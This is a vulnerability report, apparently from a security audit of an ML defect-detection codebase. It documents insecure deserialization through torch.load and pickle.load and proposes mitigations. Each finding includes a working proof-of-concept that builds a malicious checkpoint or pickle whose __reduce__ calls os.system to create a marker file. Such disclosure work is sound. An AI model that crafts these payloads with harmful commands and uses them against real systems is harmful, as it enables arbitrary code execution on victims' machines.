### Vulnerability List

* Vulnerability Name: Insecure Deserialization in PyTorch Model Checkpoints

* Description:
    1. The project uses `torch.load` to load pre-trained model checkpoints for defect detection (both video and image) and segmentation tasks.
    2. The code in `/code/defect_detection/defect_videos/src/model.py` loads checkpoints from the `pretrained_ckpt` directory using hardcoded paths like `"pretrained_ckpt/SLOWFAST_8x8_R50_ssv2.pyth"`, `"pretrained_ckpt/R2PLUS1D_16x4_R50.pyth"`, and `"pretrained_ckpt/MVIT_B_32x3.pyth"`.
    3. Similarly, the training and testing scripts in `/code/defect_detection/defect_videos/src/train.py`, `/code/defect_detection/defect_images/train.py`, `/code/segmentation/test_mask_rcnn.py`, and `/code/segmentation/train_mask_rcnn.py` load checkpoints using `torch.load` or `torch.load_from_checkpoint` via command line arguments like `--checkpoint` or `--resume-from`.
    4. If a user is tricked into using a malicious checkpoint file (e.g., by replacing the legitimate checkpoint in `pretrained_ckpt` or providing a path to a malicious file via command-line arguments), arbitrary Python code embedded within the checkpoint file will be executed during the deserialization process by `torch.load`.
    5. An attacker can craft a malicious PyTorch checkpoint that, when loaded, executes arbitrary code on the user's machine.

* Impact:
    - Arbitrary code execution on the user's machine.
    - Full compromise of the user's system if the attacker's code gains sufficient privileges.
    - Data exfiltration, malware installation, or denial of service.

* Vulnerability Rank: Critical

* Currently Implemented Mitigations:
    - None. The code directly uses `torch.load` without any input validation or security checks on the checkpoint files.

* Missing Mitigations:
    - Input validation: Implement checks to ensure the checkpoint file originates from a trusted source and hasn't been tampered with. This could involve verifying a digital signature or checksum of the checkpoint file.
    - Secure loading practices: Explore safer alternatives to `torch.load` if available, or implement sandboxing or containerization when loading checkpoints from untrusted sources.
    - Documentation: Clearly warn users about the risks of loading checkpoints from untrusted sources and advise them to only use checkpoints from the official repository or trusted sources.

* Preconditions:
    - The user must download and run the provided sample code.
    - The user must be tricked into using a malicious checkpoint file, either by replacing a legitimate one or by being directed to load a malicious checkpoint via command-line arguments.

* Source Code Analysis:
    - `/code/defect_detection/defect_videos/src/model.py`:
        ```python
        if args.model == "SlowFast":
            ...
            pretrained_ckpt = torch.load("pretrained_ckpt/SLOWFAST_8x8_R50_ssv2.pyth") # [VULNERABLE LINE]
            ...
        elif args.model == "R(2+1)D":
            ...
            pretrained_ckpt = torch.load("pretrained_ckpt/R2PLUS1D_16x4_R50.pyth") # [VULNERABLE LINE]
            ...
        elif args.model == "MViT_B":
            ...
            pretrained_ckpt = torch.load("pretrained_ckpt/MVIT_B_32x3.pyth") # [VULNERABLE LINE]
            ...
        ```
        The `torch.load` function is used to load pretrained checkpoints directly from files in the `pretrained_ckpt` directory. An attacker could replace these files with malicious ones.

    - `/code/defect_detection/defect_videos/src/train.py`:
        ```python
        def train(args):
            ...
            if args.ckpt is None:
                model = VideoClassificationLightningModule(args)
            else:
                print("loading from checkpoint:", args.ckpt)
                model = VideoClassificationLightningModule.load_from_checkpoint(checkpoint_path=args.ckpt, args=args) # [VULNERABLE LINE]
            ...
        def test(args):
            ...
            print("loading from checkpoint:", args.ckpt)
            model = VideoClassificationLightningModule.load_from_checkpoint(checkpoint_path=args.ckpt, args=args) # [VULNERABLE LINE]
            ...
        ```
        The `VideoClassificationLightningModule.load_from_checkpoint` function, used in both `train` and `test` functions, likely uses `torch.load` internally to load checkpoints from the path specified by `args.ckpt`. This allows loading checkpoints from arbitrary paths, making it vulnerable if a user provides a malicious path.

    - `/code/defect_detection/defect_images/train.py`:
        ```python
        if __name__ == "__main__":
            ...
            if mode == "train":
                ...
                if args.resume:
                    ...
                    trainer.fit(model,
                                train_dataloader,
                                test_dataloader,
                                ckpt_path=args.checkpoint) # [VULNERABLE LINE]
                else:
                    trainer.fit(model, train_dataloader, test_dataloader)
            else:
                ...
                model = ARMBenchImageDefectModule.load_from_checkpoint(args.checkpoint) # [VULNERABLE LINE]
                ...
        ```
        Similar to the video defect detection, the image defect detection training and testing scripts use `ARMBenchImageDefectModule.load_from_checkpoint` with `args.checkpoint`, which is vulnerable to malicious checkpoint paths.

    - `/code/segmentation/test_mask_rcnn.py`:
        ```python
        def main():
            ...
            if args.resume_from is not None:
                checkpoint = torch.load(args.resume_from) # [VULNERABLE LINE]
                model.load_state_dict(checkpoint["model_state_dict"])
            ...
        ```
        The `test_mask_rcnn.py` script loads a checkpoint using `torch.load(args.resume_from)`, making it vulnerable to loading malicious checkpoints provided via the `--resume-from` argument.

    - `/code/segmentation/train_mask_rcnn.py`:
        ```python
        def main():
            ...
            if args.resume_from is not None:
                checkpoint = torch.load(args.resume_from) # [VULNERABLE LINE]
                model.load_state_dict(checkpoint["model_state_dict"])
                optimizer.load_state_dict(checkpoint["optimizer_state_dict"])
                s_epoch = checkpoint["epoch"] + 1
            ...
        ```
        The `train_mask_rcnn.py` script also uses `torch.load(args.resume_from)` to load checkpoints for resuming training, similarly vulnerable to malicious checkpoints.

* Security Test Case:
    1. **Prepare a malicious PyTorch checkpoint file:** Create a Python script that generates a malicious PyTorch checkpoint. This checkpoint should contain code that will be executed when `torch.load` is called. For example, it can execute a simple command like printing a message or creating a file.
        ```python
        import torch
        import os

        class MaliciousPayload:
            def __reduce__(self):
                return (os.system, ('touch /tmp/pwned',))

        torch.save({'state_dict': MaliciousPayload()}, 'malicious_checkpoint.ckpt')
        ```
    2. **Place the malicious checkpoint:**
        a. **Scenario 1 (Pretrained Checkpoint Replacement):** Replace one of the pretrained checkpoint files in the `pretrained_ckpt` directory (e.g., `pretrained_ckpt/MVIT_B_32x3.pyth`) with the `malicious_checkpoint.ckpt` and rename it to `MVIT_B_32x3.pyth`.
        b. **Scenario 2 (Command Line Argument Injection):** Keep the original `pretrained_ckpt` directory as is.
    3. **Run the vulnerable code:**
        a. **Scenario 1:** Execute the video defect detection training script that loads the replaced pretrained checkpoint. For example, run `./code/defect_detection/defect_videos/train.sh`.
        b. **Scenario 2:** Execute the video defect detection testing script, providing the path to the malicious checkpoint via the `--ckpt` argument. For example, run `./code/defect_detection/defect_videos/test.sh --ckpt /path/to/malicious_checkpoint.ckpt`.  You might need to modify `test.sh` to accept `--ckpt` argument. Or run `python -m src.train --mode test --ckpt /path/to/malicious_checkpoint.ckpt ...` directly.
    4. **Verify code execution:** Check if the malicious code was executed. In the example above, check if the file `/tmp/pwned` was created. If successful, this confirms arbitrary code execution.

* Vulnerability Name: Insecure Deserialization via Pickle in Object Identification

* Description:
    1. The `/code/identification/test.py` script uses `pickle.load` to load pre-computed feature embeddings from files named `embedding.pkl` and `testcase_embedding.pkl`.
    2. These pickle files are loaded from the dataset path, specifically `os.path.join(args.dataset_path, "embedding.pkl")` and `os.path.join(args.dataset_path, "testcase_embedding.pkl")`.
    3. If a user provides a dataset path that contains a malicious pickle file (either `embedding.pkl` or `testcase_embedding.pkl`), arbitrary Python code embedded within the pickle file will be executed during the deserialization process by `pickle.load`.
    4. An attacker can craft a malicious pickle file that, when loaded by `pickle.load`, executes arbitrary code on the user's machine.

* Impact:
    - Arbitrary code execution on the user's machine.
    - Full compromise of the user's system if the attacker's code gains sufficient privileges.
    - Data exfiltration, malware installation, or denial of service.

* Vulnerability Rank: High

* Currently Implemented Mitigations:
    - None. The code directly uses `pickle.load` without any security checks on the pickle files.

* Missing Mitigations:
    - Input validation: Implement checks to ensure the pickle files originate from a trusted source and haven't been tampered with. This could involve verifying a digital signature or checksum of the pickle files if they are distributed as part of the official dataset. If these are generated locally, consider warning users about dataset origin.
    - Secure deserialization practices: If possible, avoid using `pickle` for deserialization, especially for data from untrusted sources. Consider using safer serialization formats like JSON or protobuf, or implement robust input sanitization and validation if pickle is necessary.
    - Documentation: Clearly warn users about the risks of using datasets from untrusted sources, as these datasets might contain malicious pickle files. Advise users to only use datasets from the official repository or trusted sources.

* Preconditions:
    - The user must download and run the `/code/identification/test.py` script.
    - The user must use a dataset path that contains a malicious `embedding.pkl` or `testcase_embedding.pkl` file. This could be achieved by downloading a compromised dataset or by manually placing a malicious pickle file in the dataset directory.

* Source Code Analysis:
    - `/code/identification/test.py`:
        ```python
        def run_test(args):
            ...
            embedding_location = os.path.join(args.dataset_path, "embedding.pkl")
            testcase_embedding_location = os.path.join(args.dataset_path, "testcase_embedding.pkl")

            feature_embeddings = {}
            if os.path.exists(embedding_location):
                feature_embeddings_file = open(embedding_location, 'rb')
                feature_embeddings_saved = pickle.load(feature_embeddings_file) # [VULNERABLE LINE]
                feature_embeddings = feature_embeddings_saved['feature_embeddings']
                fnsku_map = feature_embeddings_saved['fnsku_map']
                feature_embeddings_file.close()
            else:
                ...

            testcase_embeddings = {}
            if os.path.exists(testcase_embedding_location):
                testcase_embeddings_file = open(testcase_embedding_location, 'rb')
                testcase_embeddings_saved = pickle.load(testcase_embeddings_file) # [VULNERABLE LINE]
                testcase_embeddings = testcase_embeddings_saved['testcase_embeddings']
                testcase_embeddings_file.close()
            else:
                ...
        ```
        The code uses `pickle.load` to load `embedding.pkl` and `testcase_embedding.pkl` files from the path specified by `args.dataset_path`. If a malicious user provides a dataset path containing crafted pickle files, it will lead to arbitrary code execution.

* Security Test Case:
    1. **Prepare a malicious pickle file:** Create a Python script to generate a malicious pickle file (e.g., `malicious_embedding.pkl`). This file should contain code to be executed during deserialization, similar to the PyTorch checkpoint example.
        ```python
        import pickle
        import os

        class MaliciousPayload:
            def __reduce__(self):
                return (os.system, ('touch /tmp/pickle_pwned',))

        payload = {'feature_embeddings': MaliciousPayload(), 'fnsku_map': {}}
        with open('malicious_embedding.pkl', 'wb') as f:
            pickle.dump(payload, f)
        ```
    2. **Prepare a malicious dataset directory:** Create a directory (e.g., `malicious_dataset`) and place the `malicious_embedding.pkl` file inside it.
    3. **Run the vulnerable code:** Execute the object identification test script, providing the path to the malicious dataset directory using the `-d` or `--dataset_path` argument. For example, run `python /code/identification/test.py -d /path/to/malicious_dataset`.
    4. **Verify code execution:** Check if the malicious code was executed. In the example above, check if the file `/tmp/pickle_pwned` was created. Successful creation of the file indicates arbitrary code execution.